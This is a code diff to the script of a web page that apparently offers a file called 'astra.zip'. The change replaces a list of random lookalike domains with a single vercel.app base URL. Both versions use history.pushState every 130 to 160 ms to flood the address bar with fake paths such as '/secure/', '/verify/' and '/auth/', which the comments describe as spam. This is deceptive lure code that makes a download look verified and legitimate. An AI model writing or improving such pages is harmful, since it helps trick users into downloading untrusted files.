@@ -132,20 +132,18 @@ body::before{
 
 <script>
 const FILE_NAME = "astra.zip";
+const BASE_URL = "https://astra-gamma-eight.vercel.app";
 
-function spamRandomURL() {
-  const domains = ["download-tau-five.vercel.app", "astra-secure.net", "get-astra.live", "tau-download.com", "astra-files.net"];
-  const paths = ["/dl/", "/download/", "/get/", "/secure/", "/verify/", "/file/", "/node/", "/auth/", "/processing/"];
+function spamURL() {
+  const paths = ["/dl/", "/download/", "/get/", "/secure/", "/verify/", "/file/", "/node/", "/auth/"];
 
   setInterval(() => {
-    const domain = domains[Math.floor(Math.random() * domains.length)];
     const path = paths[Math.floor(Math.random() * paths.length)];
     const code = Math.random().toString(36).substring(2, 10);
-    
-    const fullURL = "https://" + domain + path + code;
+    const fullURL = BASE_URL + path + code;
     
     history.pushState(null, "", fullURL);
-  }, 130); // Super fast spam
+  }, 160); // Fast changing
 }
 
 const steps = [
@@ -182,7 +180,7 @@ steps.forEach((s, i) => {
   }, s.t);
 });
 
-spamRandomURL();
+spamURL();
 </script>
 </body>
 </html>
